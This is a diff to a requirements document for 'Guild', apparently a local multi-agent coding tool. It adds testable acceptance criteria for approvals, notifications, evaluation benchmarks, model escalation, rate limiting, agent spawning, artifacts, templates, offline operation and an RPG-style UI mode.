+**REQ-15.4 — Batch approval -- review multiple pending requests at once**
+
+- AC-15.4.1: Multiple pending permission requests can be approved in one command
+  - verify: 3 pending tool approvals queued -> `guild approve --all` approves all 3 and agent resumes work on each
+- AC-15.4.2: Selective batch approval is supported
+  - verify: 3 pending requests -> `guild approve <id1> <id3>` approves only those two; `<id2>` remains pending
+
+**REQ-15.5 — Notification channels: desktop toast, terminal bell, webhook -- configurable**
+
+- AC-15.5.1: Desktop toast notification fires when configured
+  - verify: Set `notifications.channels = ["desktop"]` -> escalation triggers an OS-native notification (macOS notification center, Linux notify-send)
+- AC-15.5.2: Webhook notification fires with correct payload
+  - verify: Set `notifications.channels = ["webhook"]` and `notifications.webhook_url = "http://localhost:9999/hook"` -> escalation sends a POST with JSON body containing `task_id`, `question`, and `timestamp` to that URL
+- AC-15.5.3: Multiple channels fire simultaneously
+  - verify: Set `notifications.channels = ["desktop", "webhook"]` -> escalation triggers both desktop toast and webhook POST
+- AC-15.5.4: Invalid webhook URL is handled gracefully
+  - verify: Set webhook URL to unreachable host -> escalation logs "Webhook notification failed: connection refused" and does not crash the agent
 
 ### REQ-16: Testing & Evaluation Framework
 
@@ -390,25 +1354,59 @@ These emerged from design review and govern all implementation decisions:
 | REQ-16.6 | **Progressive confidence building** — benchmarks → self-development → real projects | Trust in the system built incrementally through demonstrated capability |
 | REQ-16.7 | **Self-development benchmark** — Guild can implement its own P1 features autonomously | If it can develop itself, it can develop other projects |
 
-### REQ-27: Temporal Knowledge
 
-**Goal:** Capture not just current code state but "why it was built this way" — the temporal aspect usually lost as developers change.
+#### Acceptance Criteria (REQ-16.1 through REQ-16.7)
 
-| ID | Requirement | Notes |
-|----|-------------|-------|
-| REQ-27.1 | **Decision history** — key architectural and implementation decisions stored with context and rationale | Like DECISIONS.md but queryable by the agent |
-| REQ-27.2 | **Present state + key past info** fetchable when relevant | Agent can ask "why is this module structured this way?" and get the historical answer |
-| REQ-27.3 | Project-level instruction files (like .guild/prompt.md) consumed when they exist | Industry standard steering files — use them if present |
-| REQ-27.4 | Learnings from past tasks injected as temporal context | "Last time we touched this module, X happened" |
+**REQ-16.1 — A/B testing -- same task, different models/configs, compare results**
 
-### REQ-08 (extended): MCP Plugin Architecture
+- AC-16.1.1: The same task can be run with two different configs and results compared
+  - verify: Run `guild eval --ab --config-a model=gemma4:4b --config-b model=gemma4:1b --task "write fizzbuzz"` -> output shows side-by-side comparison of completion status, token usage, and time for each config
+- AC-16.1.2: A/B results are stored for later retrieval
+  - verify: Run an A/B test -> `guild eval history` lists the comparison with both run IDs and their metrics
+- AC-16.1.3: A/B test with identical configs produces a valid comparison (baseline check)
+  - verify: Run A/B with the same config -> results show both runs completed with comparable metrics (no error from identical configs)
 
-| ID | Requirement | Notes |
-|----|-------------|-------|
-| REQ-08.8 | **MCP-native tool interface** — tools are MCP servers or expose MCP-compatible schemas | Industry standard; enables reuse of existing MCP ecosystem |
-| REQ-08.9 | Plugin-based tool loading — file-per-tool or directory-per-tool | Auto-discovery on startup |
-| REQ-08.10 | Tool behavioral properties: `isConcurrencySafe`, `isReadOnly` | Enables optimization |
-| REQ-08.11 | Tool result caching (optional, per-tool) | Avoid redundant expensive calls |
+**REQ-16.2 — Benchmark suite -- standard tasks for regression testing**
+
+- AC-16.2.1: A benchmark suite can be defined as a set of task specs
+  - verify: Create `.guild/benchmarks/core.toml` with 3 task definitions -> `guild eval --suite core` runs all 3 tasks and reports per-task results
+- AC-16.2.2: Custom benchmark suites can be created per project
+  - verify: Define a project-specific suite with domain tasks -> `guild eval --suite custom` runs those tasks and produces results
+
+**REQ-16.3 — Regression detection -- alert when config changes degrade performance**
+
+- AC-16.3.1: Regression is detected when metrics drop below baseline
+  - verify: Establish a baseline with completion rate 100% -> change config and re-run suite with completion rate 66% -> output includes "REGRESSION: completion rate dropped from 100% to 66%"
+- AC-16.3.2: No regression alert when metrics are stable or improved
+  - verify: Run suite twice with same config -> no regression warning in output
+
+**REQ-16.4 — Eval metrics -- task completion rate, time, token usage, tool calls**
+
+- AC-16.4.1: Each eval run records completion rate, elapsed time, total tokens, and tool call count
+  - verify: Run a benchmark suite of 3 tasks -> results table includes columns: task, completed (bool), time (seconds), tokens (total), tool_calls (count)
+- AC-16.4.2: Aggregate metrics are computed across the suite
+  - verify: Run a 3-task suite where 2 succeed -> aggregate shows "Completion: 2/3 (66.7%), Avg time: Xs, Total tokens: N"
+
+**REQ-16.5 — Eval results stored and browsable**
+
+- AC-16.5.1: Eval results are persisted in SQLite
+  - verify: Run a benchmark suite -> `guild eval history` shows the run with date, suite name, and summary metrics
+- AC-16.5.2: Historical results can be compared across runs
+  - verify: Run the same suite twice on different dates -> `guild eval compare <run1> <run2>` shows a delta table of metrics
+
+**REQ-16.6 — Progressive confidence building -- benchmarks -> self-development -> real projects**
+
+- AC-16.6.1: A confidence level is tracked per capability area
+  - verify: Run benchmarks in "code-generation" category -> `guild eval confidence` shows a confidence score for code-generation based on pass rate across runs
+- AC-16.6.2: Confidence increases after repeated successful runs
+  - verify: Run the same suite 3 times with 100% pass -> confidence score for that category increases from initial to elevated level
+
+**REQ-16.7 — Self-development benchmark -- Guild can implement its own P1 features autonomously**
+
+- AC-16.7.1: A self-development benchmark suite exists that tasks the agent with implementing Guild features
+  - verify: Run `guild eval --suite self-dev` -> suite contains tasks like "add a new CLI command" and "write tests for module X"
+- AC-16.7.2: Self-development results track whether generated code passes tests
+  - verify: Agent completes a self-dev task -> results include whether `pytest` passed on the generated code
 
 ### REQ-17: Multi-Model Routing & Escalation
 
@@ -425,6 +1423,126 @@ These emerged from design review and govern all implementation decisions:
 | REQ-17.7 | Escalation chain configurable per-project | `[escalation] chain = ["gemma4-4b", "gemma4-26b", "gemini-cli"]` |
 | REQ-17.8 | **Malformed output recovery** — retry with correction hint, then escalate model, then exhaust chain, only then human | Retry 1-2x with "your response was malformed" hint before escalating |
 
+#### Acceptance Criteria (REQ-17.1 through REQ-17.8)
+
+**REQ-17.1 — Per-agent model assignment**
+
+- AC-17.1.1: Each agent can be configured with a different model
+  - verify: Configure orchestrator with `model = "gemma4:26b"` and worker with `model = "gemma4:4b"` -> orchestrator LLM calls use gemma4:26b and worker calls use gemma4:4b
+- AC-17.1.2: Default model is used when no per-agent model is specified
+  - verify: Configure global `provider.model = "gemma4:4b"` with no agent-level override -> agent uses gemma4:4b
+
+**REQ-17.2 — Fallback chains -- if primary model is down/slow, use backup**
+
+- AC-17.2.1: When primary model is unreachable, fallback model is used automatically
+  - verify: Configure `fallback = ["gemma4:4b"]` and stop the primary model -> next LLM call succeeds using gemma4:4b with a log message "Primary model unavailable, falling back to gemma4:4b"
+- AC-17.2.2: Fallback chain is tried in order until one succeeds
+  - verify: Configure `fallback = ["model-a", "model-b"]` with model-a also down -> system tries model-a (fails), then model-b (succeeds)
+- AC-17.2.3: All fallbacks exhausted produces a clear error
+  - verify: Configure fallback chain where all models are down -> error: "All models in fallback chain exhausted: [primary, model-a, model-b]"
+
+**REQ-17.3 — Use cheap models for cheap decisions**
+
+- AC-17.3.1: Permission checks use the configured lightweight model
+  - verify: Configure `routing.permission_model = "gemma4:1b"` -> permission check LLM calls use gemma4:1b, not the primary model
+- AC-17.3.2: Cheap model failures fall back to the primary model
+  - verify: Cheap model returns unparseable output for a permission check -> system retries with the primary model
+
+**REQ-17.4 — Model capability tagging -- match task requirements to model strengths**
+
+- AC-17.4.1: Models can be tagged with capabilities
+  - verify: Configure `[models.gemma4-26b] capabilities = ["code-generation", "reasoning"]` -> model registry shows those tags
+- AC-17.4.2: Task requiring a specific capability is routed to a matching model
+  - verify: Task tagged `requires = ["code-generation"]` -> system selects a model with the "code-generation" capability tag
+
+**REQ-17.5 — Stuck-triggered escalation -- when stuck detector fires, automatically retry with next model in chain**
+
+- AC-17.5.1: Stuck detection triggers automatic model escalation
+  - verify: Agent loops 3 times with no progress on gemma4:4b -> stuck detector fires -> next attempt uses the next model in the escalation chain (e.g., gemma4:26b)
+- AC-17.5.2: Escalation chain is exhausted before reaching human
+  - verify: Configure chain `["gemma4:4b", "gemma4:26b", "gemini-cli"]` -> agent is stuck on all three -> only then escalates to human
+
+**REQ-17.6 — External CLI tool as provider -- shell out to installed CLI tools as escalation providers**
+
+- AC-17.6.1: An external CLI tool can be configured as an escalation provider
+  - verify: Configure `[providers.gemini-cli] type = "cli"` and `command = "gemini"` -> escalation to this provider shells out to `gemini` and parses the text response
+- AC-17.6.2: CLI provider timeout is enforced
+  - verify: Set `providers.gemini-cli.timeout = 30` -> if CLI tool takes longer than 30 seconds, it is killed and treated as a failure
+- AC-17.6.3: CLI provider that returns empty output is treated as a failure
+  - verify: CLI tool exits with code 0 but produces no output -> provider returns a failure, not an empty response
+
+**REQ-17.7 — Escalation chain configurable per-project**
+
+- AC-17.7.1: Escalation chain is read from project config
+  - verify: Set `[escalation] chain = ["gemma4-4b", "gemma4-26b", "gemini-cli"]` in project config -> escalation follows that order
+- AC-17.7.2: Invalid model names in the chain are caught at startup
+  - verify: Set `chain = ["nonexistent-model"]` -> startup warning: "Escalation chain references unknown model: nonexistent-model"
+
+**REQ-17.8 — Malformed output recovery -- retry with correction hint, then escalate**
+
+- AC-17.8.1: Malformed LLM output triggers a retry with a correction hint
+  - verify: LLM returns unparseable JSON -> system retries with "Your previous response was malformed. Please respond with valid JSON." appended
+- AC-17.8.2: After 2 retries with hints, system escalates to the next model
+  - verify: LLM returns malformed output 3 times in a row -> system switches to the next model in the escalation chain
+- AC-17.8.3: Successful recovery after a correction hint does not escalate
+  - verify: First response is malformed, retry with hint produces valid output -> system continues with the current model (no escalation)
+
+### REQ-27: Temporal Knowledge
+
+**Goal:** Capture not just current code state but "why it was built this way" — the temporal aspect usually lost as developers change.
+
+| ID | Requirement | Notes |
+|----|-------------|-------|
+| REQ-27.1 | **Decision history** — key architectural and implementation decisions stored with context and rationale | Like DECISIONS.md but queryable by the agent |
+| REQ-27.2 | **Present state + key past info** fetchable when relevant | Agent can ask "why is this module structured this way?" and get the historical answer |
+| REQ-27.3 | Project-level instruction files (like .guild/prompt.md) consumed when they exist | Industry standard steering files — use them if present |
+| REQ-27.4 | Learnings from past tasks injected as temporal context | "Last time we touched this module, X happened" |
+
+#### Acceptance Criteria (REQ-27.1 through REQ-27.4)
+
+**REQ-27.1 — Decision history -- key architectural and implementation decisions stored with context and rationale**
+
+- AC-27.1.1: Decisions are stored with context, rationale, and timestamp
+  - verify: Agent records a decision via `guild decisions add "Chose SQLite over Postgres" --rationale "Single-file, no server, embedded"` -> `guild decisions` lists the entry with timestamp, context, and rationale
+- AC-27.1.2: Decisions are queryable by keyword
+  - verify: Store 5 decisions, run `guild decisions --search "database"` -> only decisions containing "database" in context or rationale are returned
+- AC-27.1.3: Decision history persists across sessions
+  - verify: Record a decision, restart Guild, run `guild decisions` -> previously recorded decision is present
+
+**REQ-27.2 — Present state + key past info fetchable when relevant**
+
+- AC-27.2.1: Agent can query historical context for a specific module
+  - verify: Agent asks "why is the storage module structured this way?" -> knowledge system returns the relevant decision entry explaining the rationale
+- AC-27.2.2: Query returns no results gracefully when no history exists
+  - verify: Query history for a module with no recorded decisions -> system returns "No historical context found for <module>" (not an error)
+
+**REQ-27.3 — Project-level instruction files (like .guild/prompt.md) consumed when they exist**
+
+- AC-27.3.1: `.guild/prompt.md` content is injected into the agent's system prompt
+  - verify: Create `.guild/prompt.md` with "Always use type hints" -> agent's system prompt includes that instruction
+- AC-27.3.2: Missing instruction file is silently ignored
+  - verify: Delete `.guild/prompt.md`, start a task -> agent starts normally with no error about missing file
+- AC-27.3.3: Instruction file changes take effect on next task without restart
+  - verify: Update `.guild/prompt.md` while Guild is running -> next task picks up the new content
+
+**REQ-27.4 — Learnings from past tasks injected as temporal context**
+
+- AC-27.4.1: Relevant past learnings are included when the agent works on a related module
+  - verify: Complete a task on `storage/` that produces a learning "aiosqlite requires explicit commit" -> start a new task touching `storage/` -> agent's context includes that learning as a hint
+- AC-27.4.2: Learnings from unrelated modules are not injected
+  - verify: Store a learning scoped to `storage/` -> start a task on `cli/` -> that learning is not present in the agent's context
+- AC-27.4.3: Injected learnings are labeled as hints, not authoritative facts
+  - verify: Inspect the injected context for a learning -> it is prefixed with a marker like "[hint, confidence: 0.7]" indicating it should be verified
+
+### REQ-08 (extended): MCP Plugin Architecture
+
+| ID | Requirement | Notes |
+|----|-------------|-------|
+| REQ-08.8 | **MCP-native tool interface** — tools are MCP servers or expose MCP-compatible schemas | Industry standard; enables reuse of existing MCP ecosystem |
+| REQ-08.9 | Plugin-based tool loading — file-per-tool or directory-per-tool | Auto-discovery on startup |
+| REQ-08.10 | Tool behavioral properties: `isConcurrencySafe`, `isReadOnly` | Enables optimization |
+| REQ-08.11 | Tool result caching (optional, per-tool) | Avoid redundant expensive calls |
+
 ### REQ-20: Rate Limiting & Backpressure
 
 **Goal:** Prevent resource exhaustion when running many agents.
@@ -434,6 +1552,35 @@ These emerged from design review and govern all implementation decisions:
 | REQ-20.1 | Rate limiting on LLM API calls | Per-provider, configurable |
 | REQ-20.2 | Tool call queue with concurrency limits | Max N parallel shell commands |
 | REQ-20.3 | Backpressure — pause low-priority agents when system is loaded | Priority-based scheduling |
+
+#### Acceptance Criteria (REQ-20.1 through REQ-20.3)
+
+**REQ-20.1 — Rate limiting on LLM API calls**
+
+- AC-20.1.1: LLM calls are throttled to the configured rate per provider
+  - verify: Set `rate_limit.max_requests_per_minute = 10` for Ollama -> fire 20 requests in rapid succession -> only 10 complete in the first 60 seconds; remaining are delayed (not rejected)
+- AC-20.1.2: Rate limit is configurable per provider independently
+  - verify: Set Ollama rate limit to 10/min and cloud provider rate limit to 5/min -> each provider enforces its own limit independently
+- AC-20.1.3: Exceeding the rate limit produces a log entry, not a silent delay
+  - verify: Trigger rate limiting -> log contains "Rate limit reached for provider 'ollama'; delaying next request by Ns"
+
+**REQ-20.2 — Tool call queue with concurrency limits**
+
+- AC-20.2.1: No more than N shell commands run in parallel
+  - verify: Set `tool.max_concurrent_shell = 2`, trigger 5 shell tool calls simultaneously -> at most 2 run at any instant; remaining wait in queue
+- AC-20.2.2: Queued tool calls execute in FIFO order
+  - verify: Queue 3 tool calls (A, B, C) with concurrency limit 1 -> execution order is A, then B, then C
+- AC-20.2.3: Tool timeout still applies while waiting in queue
+  - verify: Set tool timeout to 5 seconds and queue a tool call behind a long-running command -> if queued tool waits 5+ seconds total (queue + execution), it times out with `ToolTimeoutError`
+
+**REQ-20.3 — Backpressure -- pause low-priority agents when system is loaded**
+
+- AC-20.3.1: Low-priority agents are paused when system load exceeds threshold
+  - verify: Run two agents (priority=high, priority=low), push CPU above `cpu_threshold_percent` -> low-priority agent is paused; high-priority agent continues
+- AC-20.3.2: Paused agents resume when system load drops below threshold
+  - verify: After backpressure pause, reduce system load below threshold -> low-priority agent resumes automatically within one polling interval
+- AC-20.3.3: Backpressure events are logged with reason
+  - verify: Trigger backpressure -> audit log contains entry "Agent <agent_id> paused: system CPU at 95% exceeds threshold 80%"
 
 ---
 
@@ -463,6 +1610,111 @@ These emerged from design review and govern all implementation decisions:
 | REQ-04.13 | **Branching strategy** — agents merge freely to staging; main/release is gated by user review | Configurable policy: which branches are protected, which are free |
 | REQ-04.14 | **Staging area** — a shared branch agents can merge to without user approval | Allows progress without blocking on review; user reviews staging → main merges in batch |
 | REQ-04.15 | **Merge policy configurable per project** — auto-merge if tests pass, always require review, or trust level per branch | As user gains trust in system, gates can be relaxed |
+
+
+#### Acceptance Criteria (REQ-04.1 through REQ-04.54)
+
+**REQ-04.1 — Entry agent is always the orchestrator**
+
+- AC-04.1.1: Starting a project always creates an entry agent as the user's sole interface
+  - verify: Run `guild task "build feature X"` -> the agent receiving the message is the entry agent, not a worker
+- AC-04.1.2: Entry agent delegates subtasks to workers rather than doing everything itself
+  - verify: Run a complex task that requires multiple skills -> entry agent spawns at least one worker via the spawn tool
+
+**REQ-04.3 — Any agent can spawn other agents, including other orchestrators**
+
+- AC-04.3.1: A worker agent can spawn its own sub-workers
+  - verify: Configure a worker that spawns a sub-worker for a subtask -> sub-worker executes and returns results to the spawning worker
+- AC-04.3.2: Spawning an orchestrator as a sub-agent does not deadlock
+  - verify: Entry agent spawns a sub-orchestrator which spawns its own workers -> all agents complete without hanging
+
+**REQ-04.4 — Agent spawning is just another tool call**
+
+- AC-04.4.1: `spawn_agent` is a registered tool with a standard tool contract
+  - verify: List registered tools -> `spawn_agent` appears with name, description, and input_schema like any other tool
+- AC-04.4.2: Spawned agent results are returned as a tool result to the calling agent
+  - verify: Agent calls `spawn_agent` -> receives the spawned agent's output as a `ToolResult`
+
+**REQ-04.7 — Simple internal message bus for agent-to-agent communication**
+
+- AC-04.7.1: `send(agent_id, port, data)` delivers a message to the target agent
+  - verify: Agent A sends a message to Agent B via the bus -> Agent B receives the message with correct port and data
+- AC-04.7.2: Messages to a non-existent agent return an error
+  - verify: Send to `agent_id="nonexistent"` -> returns an error "Agent not found" without crashing
+- AC-04.7.3: Message data is JSON-serializable
+  - verify: Send a message containing a dict with nested structures -> received message is identical after serialization round-trip
+
+**REQ-04.9 — Agent lifecycle management: spawn, monitor, pause, resume, kill**
+
+- AC-04.9.1: All five lifecycle operations are available for any agent
+  - verify: Spawn an agent, pause it, resume it, then kill it -> each operation succeeds with correct state transitions
+- AC-04.9.2: Killing a parent agent also stops its child agents
+  - verify: Kill an orchestrator with 2 running workers -> both workers are stopped within the graceful shutdown timeout
+
+**REQ-04.12 — Git worktrees as isolation model**
+
+- AC-04.12.1: Each spawned task agent gets its own git worktree
+  - verify: Spawn 2 parallel workers -> each operates in a separate directory created via `git worktree add`
+- AC-04.12.2: Worktree is cleaned up after the task completes
+  - verify: Worker finishes and merges -> the worktree directory is removed via `git worktree remove`
+- AC-04.12.3: Parallel workers can modify the same file without conflicts during work
+  - verify: Two workers edit the same file in their respective worktrees -> no file lock errors during parallel execution
+
+**REQ-04.14 — Staging area: shared branch agents can merge to without user approval**
+
+- AC-04.14.1: Workers can merge to the staging branch without human approval
+  - verify: Worker completes a subtask -> auto-merges to staging branch without prompting the user
+- AC-04.14.2: Merge to main/release requires explicit user approval
+  - verify: Attempt to merge staging into main -> Guild prompts "Approve merge to protected branch main? [yes/no]"
+
+**REQ-04.20 — Atomic blocks: single-agent building blocks with defined inputs/outputs/role**
+
+- AC-04.20.1: Each atomic block has defined input ports, output ports, and a role
+  - verify: Load the "coder" block -> it has `spec: plan` input port, `changes: code-changes` output port, and role "coder"
+- AC-04.20.2: An atomic block rejects input that does not match its port type
+  - verify: Send `text`-typed data to the "coder" block's `spec` port (which expects `plan`) -> type mismatch error
+
+**REQ-04.21 — Composite blocks: groups of connected blocks saved as a reusable unit**
+
+- AC-04.21.1: A composite block can be loaded and executed as a single unit
+  - verify: Load "verified-coder" composite -> it runs coder then evaluator internally and returns a single result
+- AC-04.21.2: Composite block definition is saveable and reloadable
+  - verify: Create a composite block from coder + reviewer, save it -> reload and execute with identical behavior
+
+**REQ-04.40 — Standard evaluator output**
+
+- AC-04.40.1: All evaluator blocks return `{pass, score, feedback, details}`
+  - verify: Run the evaluator block -> output is a dict with `pass` (bool), `score` (0-100), `feedback` (string), `details` (dict)
+- AC-04.40.2: Evaluator output missing a required field raises a validation error
+  - verify: Evaluator returns `{pass: true}` without `score` -> `EvaluatorOutputError` is raised
+
+**REQ-04.42 — Loop exit checks pass**
+
+- AC-04.42.1: Loop continues when evaluator returns `pass: false`
+  - verify: Evaluator returns `{pass: false, score: 40, feedback: "needs work"}` -> loop sends feedback to generator and runs another iteration
+- AC-04.42.2: Loop exits when evaluator returns `pass: true`
+  - verify: Evaluator returns `{pass: true, score: 90, feedback: "looks good"}` -> loop exits and returns the final artifact
+
+**REQ-04.43 — Max iteration safety limit per loop**
+
+- AC-04.43.1: Loop stops after the configured max iterations even if evaluator never passes
+  - verify: Set `max_iterations = 3` and evaluator always returns `pass: false` -> loop exits after 3 iterations with status "max iterations reached"
+- AC-04.43.2: Default max iteration limit is 5
+  - verify: Create a loop block with no explicit max_iterations config -> it stops after 5 iterations if evaluator never passes
+
+**REQ-04.50 — Block fails then retry N times**
+
+- AC-04.50.1: A failing block is retried up to the configured limit
+  - verify: Set `retry_count = 2` for a block that fails on first call -> block is retried twice (3 total attempts) before escalating
+- AC-04.50.2: Default retry count is 1
+  - verify: Block fails with no explicit retry config -> retried once (2 total attempts), then escalates
+
+**REQ-04.54 — Partial failure in parallel branches: other branches continue**
+
+- AC-04.54.1: One branch failing does not stop other parallel branches
+  - verify: Run 3 parallel branches; branch 2 fails -> branches 1 and 3 complete successfully; overall result reports branch 2 failure
+- AC-04.54.2: Partial failure is reported in the aggregate result
+  - verify: 1 of 3 branches fails -> composite result includes "1 of 3 branches failed" with details of the failed branch
 
 #### 4B: Composable Agent Blocks
 
@@ -554,6 +1806,49 @@ These emerged from design review and govern all implementation decisions:
 | REQ-18.4 | Artifact versioning — track iterations | "Draft 1, Draft 2, Final" |
 | REQ-18.5 | Artifact export | Zip, git bundle, etc. |
 
+#### Acceptance Criteria (REQ-18.1 through REQ-18.5)
+
+**REQ-18.1 — Artifact collection -- gather all outputs per task**
+
+- AC-18.1.1: All files created or modified by a task are collected in a per-task artifact directory
+  - verify: Agent creates 2 new files during a task -> `.guild/artifacts/<task_id>/` contains both files
+- AC-18.1.2: Artifact directory is created automatically when the first output is produced
+  - verify: Run a task that generates output -> `.guild/artifacts/<task_id>/` directory exists without manual creation
+- AC-18.1.3: Tasks that produce no artifacts have an empty artifact record
+  - verify: Run a task that only reads files -> `guild artifacts <task_id>` shows "No artifacts produced"
+
+**REQ-18.2 — Diff view of codebase changes made by agents**
+
+- AC-18.2.1: Git-style diffs are available for all files modified by a task
+  - verify: Agent modifies `src/main.py` -> `guild diff <task_id>` shows a unified diff of the changes to that file
+- AC-18.2.2: Diffs include additions, deletions, and modifications
+  - verify: Agent adds a file, deletes a file, and modifies a file -> `guild diff <task_id>` shows all three change types with correct diff markers
+
+**REQ-18.3 — Accept/reject/edit agent outputs before committing**
+
+- AC-18.3.1: Agent outputs can be accepted to apply them to the working tree
+  - verify: Run `guild accept <task_id>` -> all artifact changes are applied to the project working directory
+- AC-18.3.2: Agent outputs can be rejected to discard them
+  - verify: Run `guild reject <task_id>` -> artifact changes are not applied; working directory remains unchanged
+- AC-18.3.3: Partial acceptance is supported (accept some files, reject others)
+  - verify: Run `guild accept <task_id> --file src/main.py` -> only `src/main.py` changes are applied; other file changes remain pending
+
+**REQ-18.4 — Artifact versioning -- track iterations**
+
+- AC-18.4.1: Each iteration of a task produces a new artifact version
+  - verify: Agent revises code after review feedback -> `guild artifacts <task_id>` shows "v1" and "v2" with timestamps
+- AC-18.4.2: Previous versions are preserved and accessible
+  - verify: Run `guild artifacts <task_id> --version 1` -> displays the first iteration, not the latest
+
+**REQ-18.5 — Artifact export**
+
+- AC-18.5.1: Artifacts can be exported as a zip file
+  - verify: Run `guild export <task_id> --format zip` -> produces a `.zip` file containing all artifact files for that task
+- AC-18.5.2: Artifacts can be exported as a git bundle
+  - verify: Run `guild export <task_id> --format git-bundle` -> produces a `.bundle` file that can be cloned with `git clone`
+- AC-18.5.3: Export of a task with no artifacts produces a clear message
+  - verify: Run `guild export <task_id>` on a task with no artifacts -> error: "No artifacts to export for task <task_id>"
+
 ### REQ-19: Session & Workflow Templates
 
 | ID | Requirement | Notes |
@@ -561,6 +1856,36 @@ These emerged from design review and govern all implementation decisions:
 | REQ-19.1 | Save a workflow as a reusable template | "Do code review like last time" |
 | REQ-19.2 | Parameterized templates | Template variables |
 | REQ-19.3 | Import/export/share templates | File-based, versionable |
+
+
+#### Acceptance Criteria (REQ-19.1 through REQ-19.3)
+
+**REQ-19.1 — Save a workflow as a reusable template**
+
+- AC-19.1.1: A completed workflow can be saved as a named template
+  - verify: Run `guild template save <task_id> --name "code-review"` -> template stored in `.guild/templates/code-review.toml`
+- AC-19.1.2: A saved template can be used to launch a new task
+  - verify: Run `guild task --template code-review` -> new task launches with the same agent config, tools, and workflow steps as the original
+- AC-19.1.3: Saving a template from a non-existent task produces a clear error
+  - verify: Run `guild template save nonexistent-id --name "test"` -> error: "No task found with ID nonexistent-id"
+
+**REQ-19.2 — Parameterized templates**
+
+- AC-19.2.1: Templates support variable placeholders
+  - verify: Create a template with `description = "Review PR {{pr_number}}"` -> `guild task --template code-review --var pr_number=42` produces a task with description "Review PR 42"
+- AC-19.2.2: Missing required variables produce a clear error
+  - verify: Template requires `{{repo}}` but `guild task --template code-review` is run without `--var repo=...` -> error: "Template requires variable: repo"
+- AC-19.2.3: Unused variables are ignored without error
+  - verify: Run `guild task --template code-review --var pr_number=42 --var extra=hello` -> task launches successfully; extra variable is silently ignored
+
+**REQ-19.3 — Import/export/share templates**
+
+- AC-19.3.1: Templates can be exported to a standalone file
+  - verify: Run `guild template export code-review --output review.toml` -> produces a self-contained TOML file
+- AC-19.3.2: Templates can be imported from a file
+  - verify: Run `guild template import review.toml` -> template becomes available in `guild template list`
+- AC-19.3.3: Importing a template with the same name as an existing one requires confirmation
+  - verify: Import a template named "code-review" when one already exists -> prompt: "Template code-review already exists. Overwrite? [y/N]"
 
 ### REQ-21: Offline-First Design
 
@@ -570,6 +1895,40 @@ These emerged from design review and govern all implementation decisions:
 | REQ-21.2 | Cloud features degrade gracefully | Clear error, automatic fallback to local |
 | REQ-21.3 | Local model management from Guild | `guild models list`, `guild models pull` |
 | REQ-21.4 | Offline documentation | `guild help <topic>` |
+
+#### Acceptance Criteria (REQ-21.1 through REQ-21.4)
+
+**REQ-21.1 — Core functionality works with zero internet**
+
+- AC-21.1.1: Agent runs a full task with no internet connectivity
+  - verify: Disconnect network, start Ollama with a local model, run `guild task "list files"` -> task completes successfully using local model and local tools
+- AC-21.1.2: No startup error when internet is unavailable
+  - verify: Disconnect network, run `guild status` -> CLI responds normally with no connection-related errors
+
+**REQ-21.2 — Cloud features degrade gracefully**
+
+- AC-21.2.1: Cloud provider failure falls back to local provider
+  - verify: Configure a cloud provider as primary with Ollama as fallback, disconnect internet -> agent logs "Cloud provider unreachable, falling back to local" and continues with Ollama
+- AC-21.2.2: Fallback produces a clear log message, not a silent switch
+  - verify: Trigger cloud fallback -> log contains explicit message identifying which provider failed and which fallback was activated
+- AC-21.2.3: Features that require internet report unavailability without crashing
+  - verify: Attempt a webhook notification with no internet -> log contains "Webhook delivery failed: network unreachable"; agent continues normally
+
+**REQ-21.3 — Local model management from Guild**
+
+- AC-21.3.1: `guild models list` shows locally available models
+  - verify: Pull a model via Ollama, run `guild models list` -> output includes the model name, size, and quantization level
+- AC-21.3.2: `guild models pull <name>` downloads a model via Ollama
+  - verify: Run `guild models pull gemma4:4b` -> model downloads and subsequently appears in `guild models list`
+- AC-21.3.3: Pulling a model that does not exist produces a clear error
+  - verify: Run `guild models pull nonexistent-model-xyz` -> error message "Model 'nonexistent-model-xyz' not found in Ollama registry"
+
+**REQ-21.4 — Offline documentation**
+
+- AC-21.4.1: `guild help <topic>` displays documentation without internet
+  - verify: Disconnect network, run `guild help permissions` -> help text for the permissions system is displayed
+- AC-21.4.2: Requesting help for an unknown topic returns a suggestion
+  - verify: Run `guild help foobar` -> output includes "Unknown topic 'foobar'. Available topics:" followed by a list
 
 ### REQ-22: RPG Fun Mode (UI Theme)
 
@@ -581,6 +1940,50 @@ These emerged from design review and govern all implementation decisions:
 | REQ-22.4 | Quest log view for task history | RPG-style quest tracker |
 | REQ-22.5 | Agent "character sheets" | Model, tools, stats |
 | REQ-22.6 | Fun notifications | "A new quest has arrived!" |
+
+#### Acceptance Criteria (REQ-22.1 through REQ-22.6)
+
+**REQ-22.1 — UI mode toggle: "serious" (default) and "RPG" mode**
+
+- AC-22.1.1: Default UI mode is "serious"
+  - verify: Fresh install, run any CLI command -> output uses standard terminology (tasks, agents, teams)
+- AC-22.1.2: RPG mode is activated via config
+  - verify: Run `guild config set ui.mode rpg` -> subsequent CLI output uses RPG terminology (quests, adventurers, parties)
+- AC-22.1.3: Switching back to "serious" restores standard terminology
+  - verify: Set `ui.mode = "rpg"`, then set `ui.mode = "serious"` -> output reverts to standard terms
+
+**REQ-22.2 — RPG mode renames concepts in the UI only**
+
+- AC-22.2.1: Renaming is display-only; internal data structures remain unchanged
+  - verify: In RPG mode, create a task -> SQLite stores it in the `tasks` table (not "quests"); `guild ps` displays it as a "Quest"
+- AC-22.2.2: Config files and API responses use canonical names regardless of mode
+  - verify: In RPG mode, export task data as JSON -> keys are `task_id`, `status`, not RPG equivalents
+
+**REQ-22.3 — RPG-style progress indicators**
+
+- AC-22.3.1: Task progress renders as an XP bar in RPG mode
+  - verify: Run a task in RPG mode that has 5 subtasks -> `guild status` shows an XP-style progress bar (e.g., "XP: [====------] 2/5")
+- AC-22.3.2: Standard progress rendering in serious mode is unaffected
+  - verify: Same task in serious mode -> `guild status` shows a plain progress indicator without RPG theming
+
+**REQ-22.4 — Quest log view for task history**
+
+- AC-22.4.1: `guild history` in RPG mode displays as a quest log
+  - verify: Complete 3 tasks in RPG mode, run `guild history` -> output is styled as "Quest Log" with RPG-style status labels (e.g., "Completed", "Failed")
+- AC-22.4.2: Quest log contains the same data as standard history
+  - verify: Compare `guild history` output in serious mode vs RPG mode -> same tasks, same details, different styling
+
+**REQ-22.5 — Agent "character sheets"**
+
+- AC-22.5.1: `guild status --agent <name>` in RPG mode displays a character sheet
+  - verify: In RPG mode, run `guild status --agent coder` -> output includes model as "Class", tools as "Abilities", token usage as "Stats"
+
+**REQ-22.6 — Fun notifications**
+
+- AC-22.6.1: Notifications use RPG-themed language in RPG mode
+  - verify: In RPG mode, receive a task completion notification -> message reads something like "Quest Complete! Your party has triumphed!" instead of "Task completed"
